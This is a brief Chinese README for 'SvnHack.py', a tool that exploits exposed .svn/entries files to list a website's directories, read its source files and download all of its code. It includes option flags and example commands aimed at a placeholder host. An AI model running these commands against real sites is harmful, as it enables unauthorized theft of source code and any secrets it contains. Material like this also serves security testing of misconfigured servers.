SvnHack
=
 
Svn信息泄露利用工具，该脚本功能包括：列取网站目录、读取源码文件、下载整站代码。
 
Usage: SvnHack.py [options]
 
Options:
 
  -h, --help            show this help message and exit
 
  -u Url, --url=Url     add a svn url.
 
  -d Dic, --dic=Dic     list a directory.
 
  -r READFILE, --read=READFILE   read a file.
 
  --download            download the entire station.

例子
=
列取目录: 
 
    - 根目录       python SvnHack.py -u http://x.x.x.x/.svn/entries  
 
    - 指定目录     python SvnHack.py -u http://x.x.x.x/.svn/entries  -d scripts
 
读取源码文件:
 
    -  指定文件    python SvnHack.py -u http://x.x.x.x/.svn/entries  -d scripts -r  upd.js
 
下载整站代码:          
 
    -              python SvnHack.py -u http://x.x.x.x/.svn/entries  —download
 
